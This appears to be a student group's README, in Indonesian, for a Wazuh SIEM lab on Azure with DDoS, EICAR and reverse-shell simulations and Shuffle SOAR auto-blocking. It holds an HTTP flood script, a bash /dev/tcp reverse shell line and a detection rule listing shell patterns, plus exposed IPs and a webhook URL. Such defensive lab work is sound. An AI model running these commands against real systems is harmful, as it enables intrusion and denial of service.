#  MIKS Group Task #1 Wazuh SIEM Deployment & Attack Simulation

##  Anggota Kelompok & Pembagian Peran

| Nama | Peran | VM yang Dikelola |
|------|-------|-----------------|
| **M Arkan Zahir Asyafiq** | Blue Team / Analyst | Wazuh Manager (`70.153.25.121`) |
| **Naila Raniyah Hanan** | Victim / Target Server | Agent 1 (`70.153.148.250`) |
| **Zahra Hafizhah** | Red Team / Attacker | Agent 2 (`70.153.25.91`) |

## Daftar Isi

1. [Arsitektur Infrastruktur](#-arsitektur-infrastruktur)
2. [Workflow Project](#-workflow-project)
3. [Deployment Wazuh di Azure](#-deployment-wazuh-di-azure)
4. [Skenario 1: Simulasi Serangan DDoS](#-skenario-1-simulasi-serangan-ddos-http-flood)
5. [Skenario 2: Integrasi Malware Module (VirusTotal)](#-skenario-2-integrasi-malware-module-virustotal)
6. [Skenario 3: Fileless Malware & Memory Forensics](#-skenario-3-fileless-malware--memory-forensics)
7. [Skenario 4: Mitigasi DDoS Otomatis dengan Shuffle SOAR](#-skenario-4-mitigasi-ddos-otomatis-dengan-shuffle-soar)
8. [Logging Density & Distribution](#-logging-density--distribution)
9. [Custom Rules](#-custom-rules)
10. [Kesimpulan & Lessons Learned](#-kesimpulan--lessons-learned)

## Arsitektur Infrastruktur

Infrastruktur dibangun di **Microsoft Azure** menggunakan 3 Virtual Machine (VM) dengan memanfaatkan **Azure for Students Free Tier**.

```
┌─────────────────────────────────────────────────────────────┐
│                    AZURE CLOUD (Indonesia Central)          │
│                                                             │
│  ┌───────────────── ─┐                                      │
│  │  WAZUH MANAGER    │         IP: 70.153.25.121            │
│  │  (MIKS-Group)     │    OS: Ubuntu 24.04 LTS              │
│  │                   │  Size: Standard_B2als_v2             │
│  │  • Wazuh Manager  │                                      │
│  │  • Wazuh Dashboard│                                      │
│  │  • Wazuh Indexer  │                                      │
│  │  • VirusTotal API │                                      │
│  └────────┬──────── ─┘                                      │
│           │ (Menerima log dari Agt)                         │
│     ┌─────┴─────┐                                           │
│     │           │                                           │
│  ┌──▼───────┐ ┌─▼──────────┐                                │
│  │ AGENT 1  │ │  AGENT 2   │                                │
│  │ (TARGET) │ │ (ATTACKER) │                                │
│  │          │ │            │                                │
│  │ IP:      │ │ IP:        │                                │
│  │ 70.153.  │ │ 70.153.    │                                │
│  │ 148.250  │ │ 25.91      │                                │
│  │          │ │            │                                │
│  │ • Nginx  │ │ • Apache   │                                │
│  │ • Wazuh  │ │   Bench    │                                │
│  │   Agent  │ │ • Wazuh    │                                │
│  │ • Auditd │ │   Agent    │                                │
│  │ • FIM    │ │            │                                │
│  └──────────┘ └────────────┘                                │
└─────────────────────────────────────────────────────────────┘
```

### Spesifikasi VM

| Komponen | VM Size | OS | Disk |
|----------|---------|-----|------|
| Wazuh Manager | Standard_B2als_v2 | Ubuntu 24.04 LTS | 30 GB |
| Agent 1 (Target) | Standard_B2als_v2 | Ubuntu 24.04 LTS | 30 GB |
| Agent 2 (Attacker) | Standard_B2als_v2 | Ubuntu 24.04 LTS | 30 GB |


## Workflow Project

Berikut adalah alur kerja keseluruhan project dari awal hingga akhir:

```
┌─────────────┐       ┌──────────────┐     ┌───────────────┐
│  1. DEPLOY  │────▶ │ 2. CONFIGURE │────▶│  3. SIMULATE  │
│  Wazuh di   │       │  Rules &     │     │  Serangan     │
│  Azure      │       │  Modules     │     │  (DDoS,       │
│  (3 VM)     │       │              │     │   Malware,    │
│             │       │              │     │   Fileless)   │
└─────────────┘       └──────────────┘     └───────┬───────┘
                                                  │
                    ┌──────────────┐     ┌────────▼────────┐
                    │ 5. REPORT &  │◀────│  4. VALIDATE &  │
                    │  DOCUMENT    │     │  MONITOR        │
                    │              │     │  (Dashboard &   │
                    │              │     │   Terminal)     │
                    └──────────────┘     └─────────────────┘
```

### Langkah-langkah Detail:

1. **Deploy (Hari 1-2):**
   - Membuat 3 VM di Azure Portal
   - Menginstal Wazuh Manager (All-in-One) di VM pertama
   - Menginstal Wazuh Agent di VM kedua dan ketiga
   - Mendaftarkan Agent ke Manager

2. **Configure (Hari 3-5):**
   - Menginstal Nginx di Agent 1 sebagai target web server
   - Membuat custom rules untuk deteksi DDoS (`local_rules.xml`)
   - Mengintegrasikan VirusTotal API ke Manager
   - Menginstal dan mengonfigurasi Auditd di Agent 1
   - Mengaktifkan File Integrity Monitoring (FIM) untuk direktori tertentu
   - Membuat custom rules untuk deteksi Fileless Malware

3. **Simulate (Hari 6-7):**
   - Menjalankan script DDoS HTTP Flood dari Agent 2 ke Agent 1
   - Menjatuhkan file EICAR (malware dummy) ke Agent 1
   - Mengeksekusi Reverse Shell (Fileless Malware) di Agent 1

4. **Validate & Monitor:**
   - Memantau alert secara real-time di terminal Manager
   - Memverifikasi alert muncul di Wazuh Dashboard
   - Mengambil screenshot sebagai bukti

5. **Report & Document:**
   - Menyusun laporan di GitHub
   - Mendokumentasikan seluruh konfigurasi dan hasil


## Deployment Wazuh di Azure

### Langkah 1: Membuat Virtual Machine di Azure

1. Login ke [Azure Portal](https://portal.azure.com)
2. Buat 3 VM dengan spesifikasi yang sama (Ubuntu 24.04 LTS, Standard_B2als_v2)
3. Pastikan ketiga VM berada dalam **Resource Group** dan **Virtual Network** yang sama agar bisa berkomunikasi secara internal

**Screenshot: Azure Portal — Ketiga VM dalam status Running**

<img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/da2b28e8-9b88-400c-a3ee-14438ea04e4d" />

### Langkah 2: Instalasi Wazuh Manager (All-in-One)

```bash
# SSH ke Wazuh Manager
ssh -i wazuh_key.pem arkan@70.153.25.121

# Download dan jalankan installer Wazuh All-in-One
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
sudo bash ./wazuh-install.sh -a
```

Setelah instalasi selesai, akan muncul kredensial login untuk Dashboard:
- **URL Dashboard:** `https://70.153.25.121`
- **Username:** `admin`
- **Password:** *(dicatat saat instalasi)*

### Langkah 3: Instalasi Wazuh Agent

```bash
# SSH ke Agent 1
ssh -i agent1-key.pem azureuser@70.153.148.250

# Install Wazuh Agent dan daftarkan ke Manager
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
apt-get update
WAZUH_MANAGER="70.153.25.121" apt-get install wazuh-agent
systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent
```

Ulangi langkah yang sama untuk **Agent 2** (`70.153.25.91`).

### Langkah 4: Instalasi Nginx di Agent 1

```bash
sudo apt-get install -y nginx
sudo systemctl enable nginx
sudo systemctl start nginx
```

**Screenshot: Wazuh Dashboard — Kedua Agent terhubung (Active)**

<img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/055a34a3-8016-4016-af38-2b152ad24496" />


## Skenario 1: Simulasi Serangan DDoS (HTTP Flood)

### Deskripsi
Simulasi serangan **Distributed Denial of Service (DDoS)** tipe HTTP Flood. Agent 2 (Attacker) membanjiri web server Nginx di Agent 1 (Target) dengan ratusan HTTP request dalam waktu singkat.

### Custom Rules yang Digunakan

Custom rules ditambahkan ke `/var/ossec/etc/rules/local_rules.xml` di Wazuh Manager:

```xml
<!-- HTTP Flood / DDoS Detection Rules -->
<group name="web,nginx,ddos,">

  <!-- Override rule 31108 agar request ke URL "/" tetap terlihat -->
  <rule id="100005" level="3">
    <if_sid>31108</if_sid>
    <description>Web server: Request to monitored URL</description>
  </rule>

  <!-- 50+ request dari IP yang sama dalam 10 detik = Warning -->
  <rule id="100010" level="6" frequency="50" timeframe="10">
    <if_matched_sid>100005</if_matched_sid>
    <same_source_ip />
    <description>Web server: Possible HTTP Flood from same source IP (50+ requests in 10s)</description>
    <group>web_flood,ddos,pci_dss_6.6,</group>
  </rule>

  <!-- 200+ request dari IP yang sama dalam 30 detik = Critical -->
  <rule id="100011" level="10" frequency="200" timeframe="30">
    <if_matched_sid>100005</if_matched_sid>
    <same_source_ip />
    <description>Web server: HIGH VOLUME HTTP Flood DETECTED - Possible DDoS Attack!</description>
    <group>web_flood,ddos,attack,pci_dss_6.6,</group>
  </rule>

</group>
```

### Langkah Eksekusi Serangan

**Dari Agent 2 (Attacker), jalankan script PowerShell:**

```powershell
# File: ddos_http_flood.ps1
$target = "http://70.153.148.250/"
$totalRequests = 500

for ($i = 1; $i -le $totalRequests; $i++) {
    Invoke-WebRequest -Uri $target -TimeoutSec 2 -ErrorAction SilentlyContinue | Out-Null
}
```

**Atau menggunakan ApacheBench (ab) dari terminal Agent 2:**

```bash
ab -n 500 -c 10 http://70.153.148.250/
```

### Monitoring di Wazuh Manager

```bash
# Pantau alert DDoS secara real-time di terminal Manager
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -E "100010|100011|HTTP Flood"
```

### Hasil yang Diharapkan

| Rule ID | Level | Deskripsi | Kondisi Trigger |
|---------|-------|-----------|-----------------|
| 100010 | 6 (Warning) | Possible HTTP Flood | 50+ request / 10 detik |
| 100011 | 10 (Critical) | HIGH VOLUME HTTP Flood — DDoS Attack! | 200+ request / 30 detik |

**Screenshot: Alert DDoS di Wazuh Dashboard**

<img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/f03e1487-3278-4775-a51c-979ad338194b" />


##  Skenario 2: Integrasi Malware Module (VirusTotal)

### Deskripsi
Wazuh diintegrasikan dengan **VirusTotal API** untuk mendeteksi file malware yang masuk ke server. Ketika File Integrity Monitoring (FIM) mendeteksi file baru di direktori yang dipantau, Wazuh secara otomatis mengirimkan hash file tersebut ke VirusTotal untuk diverifikasi apakah file tersebut termasuk malware.

### Konfigurasi di Wazuh Manager

**Integrasi VirusTotal** ditambahkan ke `/var/ossec/etc/ossec.conf`:

```xml
<integration>
  <name>virustotal</name>
  <api_key>YOUR_VIRUSTOTAL_API_KEY</api_key>
  <rule_id>550,554</rule_id>
  <alert_format>json</alert_format>
</integration>
```

### Konfigurasi File Integrity Monitoring (FIM) di Agent 1

Ditambahkan ke bagian `<syscheck>` pada `/var/ossec/etc/ossec.conf` di Agent 1:

```xml
<syscheck>
  <directories realtime="yes">/home/azureuser/malware_test</directories>
</syscheck>
```

Direktori `/home/azureuser/malware_test` akan dipantau secara **real-time**. Setiap kali ada file baru yang masuk, Wazuh akan mengirimkan hash-nya ke VirusTotal.

### Langkah Eksekusi (Simulasi Malware)

**Dari Agent 1, buat file EICAR (malware test dummy):**

```bash
# EICAR adalah file test standar internasional yang dikenali
# oleh semua antivirus sebagai "malware" untuk keperluan testing
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /home/azureuser/malware_test/eicar.com
```

**Catatan:** EICAR **bukan** virus sungguhan. Ini adalah string test yang disepakati oleh seluruh industri antivirus untuk menguji apakah sistem deteksi berfungsi dengan baik.

### Hasil yang Diharapkan

1. **FIM Alert (Rule 550/554):** Wazuh mendeteksi file baru di direktori yang dipantau
2. **VirusTotal Alert:** VirusTotal mengonfirmasi bahwa hash file `eicar.com` adalah **Malicious** dan terdeteksi oleh 60+ antivirus engine

**Screenshot: Alert VirusTotal di Wazuh Dashboard**

<img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/c8e1f7aa-6128-4fe9-a82e-caf843e3b008" />


---

## Skenario 3: Fileless Malware & Memory Forensics

### Deskripsi
Simulasi **Fileless Malware** menggunakan teknik **Living off the Land (LotL)**. Berbeda dengan malware tradisional yang berbentuk file (`.exe`, `.sh`), fileless malware beroperasi **langsung di dalam RAM (memori)** tanpa meninggalkan jejak file di hard disk.

Wazuh mendeteksi serangan ini melalui **behavioral analysis** menggunakan integrasi **Auditd** yang memantau setiap perintah yang dieksekusi di level kernel.

### Konfigurasi Auditd di Agent 1

**Instalasi Auditd:**

```bash
sudo apt-get install -y auditd audispd-plugins
```

**Audit Rules** (`/etc/audit/rules.d/audit.rules`):

```
## Pantau semua eksekusi perintah (system call: execve)
-a always,exit -F arch=b64 -S execve -k audit-wazuh-c
-a always,exit -F arch=b32 -S execve -k audit-wazuh-c
```

**Konfigurasi Wazuh Agent** untuk membaca log Auditd:

```xml
<!-- Ditambahkan ke ossec.conf di Agent 1 -->
<localfile>
  <log_format>audit</log_format>
  <location>/var/log/audit/audit.log</location>
</localfile>
```

### Custom Rule Deteksi Fileless Malware

Ditambahkan ke `local_rules.xml` di Wazuh Manager:

```xml
<!-- Fileless Malware / Memory Forensics Rules -->
<group name="auditd,fileless,malware,">
  <rule id="100020" level="12">
    <decoded_as>auditd</decoded_as>
    <match>bash -i|import socket|pty.spawn|/dev/tcp/|nc -e</match>
    <description>FILELESS MALWARE: Suspicious in-memory reverse shell execution detected!</description>
    <group>attack,pci_dss_10.6.1,</group>
  </rule>
</group>
```

### Langkah Eksekusi (Simulasi Fileless Malware)

Skenario: Attacker telah berhasil masuk ke Agent 1 dan menjalankan **Reverse Shell** langsung di memori tanpa membuat file apa pun.

**Dari terminal Agent 1, jalankan:**

```bash
# Reverse Shell menggunakan Bash (Fileless - langsung di memori)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Penjelasan:** Perintah di atas tidak membuat file `.sh` atau `.py`. Perintah ini langsung dieksekusi oleh interpreter Bash di dalam RAM, membuka koneksi jaringan balik (reverse connection) ke IP attacker. Ini adalah contoh klasik teknik **Living off the Land**.

### Mengapa Ini Relevan dengan Memory Forensics?

| Aspek | Malware Tradisional | Fileless Malware |
|-------|-------------------|-----------------|
| **Lokasi** | Tersimpan di hard disk | Berjalan di RAM saja |
| **Jejak File** | Ada file `.exe`, `.sh`, dll | Tidak ada file |
| **Deteksi** | Antivirus/VirusTotal (hash scan) | Behavioral analysis (Auditd + SIEM) |
| **Persistensi** | Bertahan setelah reboot | Hilang setelah reboot |
| **Kompleksitas** | Mudah dideteksi | Sulit dideteksi |

### Hasil yang Diharapkan

Wazuh akan memunculkan alert **Level 12 (Critical)** dengan deskripsi:
```
FILELESS MALWARE: Suspicious in-memory reverse shell execution detected!
```

**Screenshot: Alert Fileless Malware di Wazuh Dashboard**

<img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/540c32bd-316d-4057-8cc2-59da00851cf2" />

---

## Skenario 4: Mitigasi DDoS Otomatis dengan Shuffle SOAR

### Deskripsi
Setelah mendeteksi serangan pada **Skenario 1**, admin biasanya harus memblokir penyerang secara manual. **Skenario 4** mengintegrasikan **Shuffle SOAR (Security Orchestration, Automation, and Response)** untuk mendeteksi secara instan melalui Webhook, mengirimkan notifikasi ke **Telegram**, dan secara otomatis mengeksekusi **Active Response** (iptables drop) di Agent 1 untuk memblokir IP Agent 2 tanpa intervensi manusia (*Zero-Touch Mitigation*).

### Alur Integrasi SOAR
```
┌─────────────────┐      JSON Alert      ┌──────────────────┐
│  Wazuh Manager  │─────────────────────▶│   Shuffle SOAR   │
│                 │                      │                  │
│  • Rule 100010  │                      │  • Webhook       │
└─────────────────┘                      └────────┬─────────┘
         ▲                                        │
         │ Active Response (PUT API)              │ Notifikasi Telegram
         ├────────────────────────────────────────┼──────────────┐
         │                                        ▼              ▼
┌────────┴────────┐                      ┌─────────────────┐  ┌─────────────┐
│  Agent 1 (Web)  │                      │   Wazuh Manager │  │  Telegram   │
│                 │                      │   REST API      │  │  Bot        │
│  • iptables DROP│                      │   (Port 55000)  │  └─────────────┘
└─────────────────┘                      └─────────────────┘
```

### Konfigurasi di Wazuh Manager (`ossec.conf`)
Menambahkan integrasi webhook ke Shuffle SOAR dan mengaktifkan Active Response:

```xml
<!-- Integrasi Webhook ke Shuffle SOAR -->
<integration>
  <name>shuffle</name>
  <hook_url>https://20.17.179.157:3443/api/v1/hooks/webhook_933588a2-a359-4a45-84e4-d51f64bddcff</hook_url>
  <rule_id>100010,100011</rule_id>
  <alert_format>json</alert_format>
</integration>
```

### Konfigurasi Workflow di Shuffle SOAR
Workflow di Shuffle terdiri dari 4 node utama:
1. **Webhook 1**: Menerima payload alert JSON dari Wazuh Manager saat Rule `100010` terpicu.
2. **Telegram Bot 1**: Mengirimkan notifikasi insiden langsung ke kanal chat Telegram admin.
3. **Http 1 (Get Token)**: Melakukan request `GET` secara aman ke API Wazuh Manager (`https://192.168.102.1:55000/security/user/authenticate`) untuk mendapatkan token JWT akses dinamis yang valid.
4. **Http 2 (Trigger Active Response)**: Menggunakan token dari node sebelumnya untuk mengirimkan request `PUT` ke API Wazuh Manager guna mengeksekusi perintah Active Response `firewall-drop300` bagi IP penyerang pada Agent 1.

### Langkah Eksekusi (Simulasi Mitigasi Otomatis)
1. **Attacker** (Agent 2) memulai banjir HTTP Flood menggunakan `./flood.sh`.
2. **Wazuh Manager** menangkap alert DDoS dan menembakkannya ke **Shuffle Webhook**.
3. **Telegram** berbunyi memberi sinyal bahaya, sementara **Shuffle** secara otomatis memanggil API Wazuh untuk memblokir IP Agent 2.
4. Serangan di terminal Agent 2 mendadak macet total (Connection Timeout).
5. Pada Agent 1, verifikasi aturan blokir yang terpasang otomatis:
   ```bash
   sudo iptables -L INPUT -n -v | grep DROP
   ```

### Hasil yang Diharapkan
IP penyerang berhasil diisolasi dalam hitungan detik secara otomatis, sementara pengguna sah lainnya tetap dapat mengakses web server Agent 1 dengan lancar.

### Bukti Screenshot Pengujian

<img width="1203" height="375" alt="image" src="https://github.com/user-attachments/assets/fd6c28e8-96c3-4eb5-994b-82b7509051cc" />



<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bbc1875e-c621-45e1-972e-0dc42bd15687" />


<img width="721" height="233" alt="image" src="https://github.com/user-attachments/assets/bb409847-5456-4964-9cae-4a135a96c841" />


---

## Logging Density & Distribution

### Sumber Log yang Dikumpulkan

Wazuh mengumpulkan log dari berbagai sumber di setiap agent:

| Sumber Log | Format | Lokasi | Tujuan |
|------------|--------|--------|--------|
| Nginx Access Log | Apache | `/var/log/nginx/access.log` | Deteksi DDoS & web attack |
| Nginx Error Log | Apache | `/var/log/nginx/error.log` | Deteksi error & anomali |
| Auditd Log | Audit | `/var/log/audit/audit.log` | Deteksi fileless malware |
| Syslog | Syslog | `/var/log/syslog` | Monitoring sistem umum |
| DPKG Log | Syslog | `/var/log/dpkg.log` | Monitoring instalasi paket |
| Active Response Log | Syslog | `/var/ossec/logs/active-responses.log` | Monitoring respons otomatis |

### Distribusi Log

```
Agent 1 (Target Server)          Agent 2 (Attacker)
├── Nginx Access Log ──────┐     ├── Syslog ─────────────┐
├── Nginx Error Log ───────┤     └── Auth Log ───────────┤
├── Auditd Log ────────────┤                              │
├── Syslog ────────────────┤                              │
└── DPKG Log ──────────────┤     ┌────────────────────────┘
                           ▼     ▼
                    ┌──────────────────┐
                    │  WAZUH MANAGER   │
                    │                  │
                    │  • Indexer       │
                    │  • Rules Engine  │
                    │  • Alert System  │
                    │  • Dashboard     │
                    └──────────────────┘
```

### Optimalisasi Logging

- **Vulnerability Detector:** Dinonaktifkan untuk mencegah disk exhaustion (pernah menghabiskan 23GB disk space)
- **FIM Frequency:** Dikonfigurasi untuk scan real-time pada direktori kritis saja (`/home/azureuser/malware_test`)
- **Log Rotation:** Menggunakan rotasi log default untuk mencegah penumpukan


## Custom Rules

Seluruh custom rules disimpan di file [`configs/local_rules.xml`](configs/local_rules.xml).

| Rule ID | Level | Kategori | Deskripsi |
|---------|-------|----------|-----------|
| 100001 | 5 | SSH | Deteksi authentication failure dari IP tertentu |
| 100005 | 3 | Web | Override rule bawaan agar request ke URL `/` tetap terlihat |
| 100010 | 6 | DDoS | Possible HTTP Flood (50+ request/10 detik) |
| 100011 | 10 | DDoS | HIGH VOLUME HTTP Flood — DDoS Attack! (200+ request/30 detik) |
| 100020 | 12 | Fileless Malware | Deteksi reverse shell execution di memori |


## Struktur Repository

```
TASK1_MIKS/
├── README.md                          # Laporan ini
├── configs/
│   ├── local_rules.xml                # Custom Wazuh rules
│   ├── audit_rules.conf               # Auditd rules untuk Agent 1
│   ├── virustotal_integration.xml     # Konfigurasi integrasi VirusTotal
│   ├── ossec_soar.conf                # Konfigurasi Wazuh Manager + SOAR
│   └── shuffle_workflow.json          # File export workflow Shuffle SOAR
├── scripts/
│   ├── ddos_http_flood.ps1            # Script simulasi DDoS (PowerShell)
│   ├── fileless_malware_test.sh       # Script simulasi Fileless Malware
│   ├── flood.sh                       # Script simulasi DDoS Bash
│   └── trigger_ar.py                  # Script Python penembak Wazuh API
└── screenshots/                       # Bukti screenshot (akan ditambahkan)
```

## Kesimpulan & Lessons Learned

### Kesimpulan

1. **Wazuh SIEM** berhasil di-deploy di Azure menggunakan arsitektur 3 VM (1 Manager + 2 Agent) dengan memanfaatkan Azure for Students Free Tier.
2. **Serangan DDoS** berhasil dideteksi menggunakan custom rules yang memantau frekuensi HTTP request dari sumber IP yang sama.
3. **Malware Module** berhasil diintegrasikan menggunakan VirusTotal API dan File Integrity Monitoring (FIM) untuk mendeteksi file berbahaya.
4. **Fileless Malware** berhasil dideteksi menggunakan behavioral analysis melalui integrasi Auditd yang memantau eksekusi perintah mencurigakan di level kernel/memori.
5. **Mitigasi SOAR Otomatis** berhasil berjalan sempurna menggunakan Shuffle SOAR yang mengotomatisasi rantai tindakan: Deteksi ➡️ Notifikasi Telegram ➡️ Autentikasi Token API Dinamis ➡️ Pemblokiran Firewall Presisi (*Zero-Touch Security Orchestration*).

### Lessons Learned

- **SOAR Orchestration:** Integrasi SIEM dengan platform SOAR seperti Shuffle memungkinkan respons insiden berjalan dalam hitungan detik, menghilangkan latensi waktu dari tindakan manual manusia.
- **Dynamic API Security:** Wazuh REST API menggunakan token JWT berdurasi pendek (15 menit). Penggunaan SOAR yang menarik token baru secara dinamis adalah satu-satunya solusi yang stabil untuk operasi jangka panjang.
- **Disk Management:** Vulnerability Detector bawaan Wazuh dapat menghabiskan disk space dengan sangat cepat (23GB+). Penting untuk memantau penggunaan disk dan menonaktifkan modul yang tidak diperlukan.
- **Custom Rules:** Rules bawaan Wazuh tidak selalu mencukupi. Custom rules sangat penting untuk mendeteksi pola serangan spesifik seperti DDoS dan fileless malware.
- **Memory Forensics:** Deteksi malware modern tidak cukup hanya mengandalkan signature-based detection (scan file). Behavioral analysis dan monitoring memori menjadi semakin krusial karena attacker semakin banyak menggunakan teknik fileless.
- **Cloud Cost Optimization:** VM Azure harus dimatikan (deallocated) saat tidak digunakan untuk menghemat biaya. Perlu diwaspadai bahwa IP Public dapat berubah setelah VM di-restart.
